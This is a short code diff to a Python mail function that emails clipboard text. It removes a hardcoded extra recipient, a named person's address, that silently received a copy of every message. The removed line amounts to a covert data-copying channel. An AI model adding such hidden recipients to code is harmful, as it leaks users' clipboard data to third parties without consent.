@@ -39,7 +39,7 @@ def send_mail(email_receiver, clipboard_text):
         with smtplib.SMTP_SSL(os.environ["MAIL_SERVER"], 465, context=context) as smtp:
             # print(email_sender, email_password)
             smtp.login(user=email_sender, password=email_password)
-            smtp.sendmail(from_addr=email_sender, to_addrs=[email_receiver, 'deniss.hohlov@narvahaigla.ee'],
+            smtp.sendmail(from_addr=email_sender, to_addrs=[email_receiver],
                           msg=em.as_string())
             show_info()
     except Exception as ex:
